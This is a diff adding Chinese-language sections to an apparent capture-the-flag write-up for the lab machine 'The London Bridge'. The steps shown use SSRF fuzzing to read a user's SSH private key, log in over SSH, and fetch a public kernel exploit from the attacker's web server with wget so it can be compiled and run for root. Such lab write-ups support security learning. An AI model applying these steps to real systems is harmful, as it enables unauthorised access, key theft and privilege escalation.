@@ -150,3 +150,63 @@ ffuf -w ports.txt -X POST -u 'http://ip:8080/view_image' -H 'Content-Type: appli
 当我们使用 SSRF 访问`80`端口页面时，我们会得到一个不同的索引页面
 ![截图](./The%20London%20Bridge/18.png)
 ![截图](./The%20London%20Bridge/19.png)
+
+### 6.揭开帷幕，查看源码
+接下来，我们要枚举了端口 `80` 上所有可能的目录。用`ffuf`，只发现了`templates` `uploads` `static`
+```bash
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://ip:8080/view_image' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:80/FUZZ' -fw 96
+```
+![截图](./The%20London%20Bridge/20.png)
+
+三个文件里明显没有什么可用信息，我们参数在FUZZ前添加`.`来扩大搜索范围，在`ssh`里会有重大发现 
+```bash
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://ip:8080/view_image' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:80/.FUZZ' -fw 96
+```
+![截图](./The%20London%20Bridge/21.png)
+
+我们查看`.ssh`里的文件内容发现了`authorized_keys`文件和`id_rsa`私钥
+![截图](./The%20London%20Bridge/22.png)
+
+请求`authorized_keys`文件，看到并确定了用户`beth`
+![截图](./The%20London%20Bridge/23.png)
+
+查看`id_rsa`私钥，把内容复制下来并保存到终端
+![截图](./The%20London%20Bridge/24.png)
+
+### 7.以 Beth 的身份使用 Shell
+先调整我们的 `id_rsa` 文件的权限，然后我们使用该密钥通过 `SSH` 以 `beth` 身份访问机器
+
+我们搜索 `user.txt` ，并能够在 `/home/beth/__pycache__/user.txt` 找到它。
+```bash
+find / -type f -name 'user.txt' 2>/dev/null
+```
+![截图](./The%20London%20Bridge/25.png)
+
+### 8.以 Root 的身份使用 Shell
+先查看内核版本
+```bash
+uname -a
+```
+![截图](./The%20London%20Bridge/26.png)
+接下来我们通过谷歌浏览搜索有没有特定的漏洞，结果还真有
+```bash
+google kernel exploit 4.15.0-112
+```
+![截图](./The%20London%20Bridge/27.png)
+> [👉 GitHub](https://github.com/zerozenxlabs/ZDI-24-020/blob/main/exploit.c)
+检查搜索结果，版本是符合我们的目标。
+![截图](./The%20London%20Bridge/28.png)
+
+我们克隆了仓库，并使用 Python Web 服务器提供内容
+![截图](./The%20London%20Bridge/29.png)
+
+接下来，我们将克隆的文件在目标机器上用递归获取所有内容，以便在那里进行编译
+```bash
+wget -r http://10.8.211.1/ZDI-24-020
+```
+
+现在我们只需要调用 make 来正确编译它
+![截图](./The%20London%20Bridge/30.png)
+
+运行漏洞利用后，我们处于 `root` 状态，可以访问 `/root/.root.txt`里的root flag
+![截图](./The%20London%20Bridge/31.png)
